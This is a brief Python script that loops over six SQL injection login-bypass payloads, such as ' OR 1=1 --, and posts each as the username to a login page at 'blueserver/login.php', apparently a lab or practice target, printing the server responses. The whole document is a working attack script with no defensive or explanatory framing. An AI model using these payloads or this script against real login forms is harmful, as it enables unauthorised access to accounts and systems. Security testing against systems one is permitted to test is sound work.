import requests

payloads = [
    "' OR '1'='1",
    "' OR '1'='0",
    "'admin' OR '1'='1'",
    "' OR 1 --",
    "' OR 1=1 --",
    "' OR ''='"
]

url = 'blueserver/login.php'

for payload in payloads:
    data_dict = {
        'user': payload,
        'pass': 'password'  
    }

    response = requests.post(url, data=data_dict)
    print(response)
